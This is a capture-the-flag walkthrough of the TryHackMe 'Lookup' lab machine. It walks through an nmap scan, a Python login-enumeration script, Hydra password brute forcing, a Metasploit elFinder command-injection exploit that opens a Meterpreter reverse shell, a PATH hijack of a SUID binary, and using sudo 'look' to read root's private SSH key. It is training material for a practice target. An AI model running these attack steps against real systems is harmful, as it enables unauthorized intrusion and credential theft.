---
title: "Lookup"
date: 2024-11-28 12:00:00 +0000
categories: [Walkthrough, Tryhackme]
tags: [Walkthrough, Cybersecurity, Tryhackme]
pin: false
---

**Test your enumeration skills on this boot-to-root machine.**

**Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in `ethical hacking`. Through "`Lookup`," hackers can master the art of `reconnaissance`, `scanning`, and `enumeration` to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as `command injection`, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in **penetration testing**.

Let' Start by using `nmap` to make a quick search fot the open ports..

```bash
nmap -sC -sV -A 10.10.77.252
```

![Screenshot](/assets/img/Lookup/image.png)

**Open Ports:**
`22/tcp`: OpenSSH 8.2p1 (Ubuntu) — likely used for remote access (SSH).
`80/tcp`: Apache httpd 2.4.41 (Ubuntu) — serving a web page that redirects to `http://lookup.thm`.

**Next Steps:**

Hosts File Modification: Since the web server redirects to `http://lookup.thm`, We’ll need to add this to our system’s `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```

We'll add the following line:

```bash
10.10.77.252 lookup.thm
```

**After updating the hosts file, visit the site:**
`http://lookup.thm`

![Screenshot](/assets/img/Lookup/1.1.png)

Okay, there is a login page but we should enumerate hidden directories first, and using tools like **Gobuster** or **Dirb**.

```bash
gobuster dir -u http://lookup.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Screenshot](/assets/img/Lookup/2.png)

there is no hidden directories here, so let's see what's next..

I'll use a Python script that automates checking for valid usernames against a login page by sending POST requests and checking the response for success or failure indicators.

```python

import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```

![Screenshot](/assets/img/Lookup/4.png)

So, We've got two valid usernames here --> `admin` and `jose`

let's try to use `jose` and brute force the password..


```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

![Screenshot](/assets/img/Lookup/5.png)

```bash
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-29 10:43:11
```

let's try logging in with this credinital...

![Screenshot](/assets/img/Lookup/6.png)

we've got this response, which means we've been redirected to --> `http://files.lookup.thm/`

![Screenshot](/assets/img/Lookup/7.png)

Let's add it to our `/etc/hosts` and login again..

```bash
sudo nano /etc/hosts
```

![Screenshot](/assets/img/Lookup/8.png)

After than I'll just reload the page..

![Screenshot](/assets/img/Lookup/9.png)

As you can see we've been redirected to this url -> `http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw`

it has many files with sensitive information, `elfinder` looks like a file manager, let's google it..

![Screenshot](/assets/img/Lookup/10.png)

okay let's continue..

Let's figure out How could we exploit `elFinder`, I found that we can exploit it using metaspolit but we have to know the `elFinder`'s version..

![Screenshot](/assets/img/Lookup/11.png)

`Version: 2.1.47`

so let's use metasploit..

```bash
searchsploit elfinder
```

![Screenshot](/assets/img/Lookup/12.1.png)

```bash
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options
```

We just have to set the`RHOSTS` to `files.lookup.thm` and the `LHOST` to our attack the box ip :

![Screenshot](/assets/img/Lookup/13.1.png)

and let's run it..

```bash
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
```
![Screenshot](/assets/img/Lookup/14.png)

as we see ` Meterpreter session 1 opened`

After successfully exploiting the target and getting a reverse shell or Meterpreter session

Run the `getuid` Command: In the Meterpreter session, simply type:

`getuid`

```bash
meterpreter > getuid
Server username: www-data
meterpreter > 
```

we get a shell as www-data 

So, let's privilege our escalation into this machiene..

```bash
cat /etc/passwd

think:x:1000:1000:,,,:/home/think:/bin/bash
```

there is a user `think` let's see it's home directory list using `ls -la` command.

```bash
ls -la /home/think
```

![Screenshot](/assets/img/Lookup/15.png)

I tried to open the .password file here but I don't have the permission, only root has..

so we need to switch our user from think to root but how could we do that??

```bash 
find / -perm /4000 2>/dev/null
```

is used in Linux and Unix-like systems to find files with the SUID (Set User ID) permission set. The SUID bit is a special type of permission that allows a user to execute a file with the permissions of the file's owner (often root), rather than the permissions of the user executing the file. This can be useful for certain system programs, but it can also be a potential security risk if misconfigured.


```c
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

The presence of the `/usr/sbin/pwm` binary stands out to me because it is not typically found on Linux hosts by default.

let's see who is the owner of this file..

```bash
ls -la /usr/sbin/pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```
I'll try to excute this file..

```c
usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

appears that this binary runs the "id" command, extracts the username from the output, and then uses that username to reference the file "/home/<username>/.passwords," potentially to perform some action with it.


If the id command is not provided with its full path (i.e., /bin/id), it will be located and executed through the directories listed in the PATH environment variable. The PATH variable contains a list of directories where executables are searched for, so if id is present in one of these directories (such as /usr/bin), it will be executed from there.

let's add /tmp to PATH like this:

```bash 
export PATH=/tmp:$PATH
```

let's make sure 

```bash
echo $PATH
```

![Screenshot](/assets/img/Lookup/16.png)

now let's create `/tmp/id` with the following content..
`#!/bin/bash`

let's run the `usr/sbin/pwm` again..

```bash
/usr/sbin/pwm
[i] Running 'id' command to extract the username and User ID (UID)
[i] ID: think
jose1006
jose1004
jose1002
```

what we got here looks like a password list, so let's save it in a file and let's try to brute force the user think.

```bash
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: ***********
```
 
Now we can login via ssh protocol with the password.

```bash
$id
uid=1000(think) gid=1000(think) groups=1000(think)
```
now we need to privilege our escalation for the last time:

```bash
$sudo -l
[Sudo] password for think:
Matching Defaults entries for think on lookup:
env_reset, mial_badpass, secure_path=/usr/local/sbin\:/usr/local/bin|:/usr/local/bin

User think may urn the following commands on lookup:
(ALL) /usr/bin/look
```

to exploit this stage we need to search for what should we do next..
`https://gtfobins.github.io/`


![Screenshot](/assets/img/Lookup/17.png)

As per GTFOBins, this binary allows us to read files on the system. Since we have root privileges, we can access any file on the system!

root’s private SSH key:

![Screenshot](/assets/img/Lookup/18.png)


We can store the key in a file on our Kali machine and then use it to log in as root.

![Screenshot](/assets/img/Lookup/19.png)


We Finaly got the root!